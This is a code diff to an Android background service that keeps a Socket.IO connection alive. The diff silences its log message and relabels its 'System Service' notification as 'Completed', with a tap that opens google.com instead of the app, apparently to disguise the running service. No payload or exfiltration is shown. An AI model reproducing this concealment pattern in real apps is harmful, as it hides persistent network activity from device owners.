@@ -46,7 +46,7 @@ public class RunningService extends Service {
         // Initialize and connect socket (Socket.IO handles auto-reconnect)
         socketManager = SocketManager.getInstance(getApplicationContext());
         socketManager.connect();
-        Log.d(TAG, "Background service started");
+//        Log.d(TAG, "Background service started");
 
         return START_STICKY;
     }
@@ -91,18 +91,26 @@ public class RunningService extends Service {
 
     @SuppressLint("ForegroundServiceType")
     private void startForegroundService() {
-        Intent notificationIntent = new Intent(this, MainActivity.class);
+        // 👉 Intent to open Google.com in browser
+        Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.google.com"));
+        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
         PendingIntent pendingIntent = PendingIntent.getActivity(
-                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
+                this,
+                0,
+                browserIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
         );
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("System Service")
-                .setContentText("System service is running...")
-                .setContentIntent(pendingIntent)
+                .setContentText("Completed")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .setContentIntent(pendingIntent)  // 👈 opens link when clicked
+                .setAutoCancel(true)
                 .build();
 
         startForeground(1, notification);
     }
+
 }
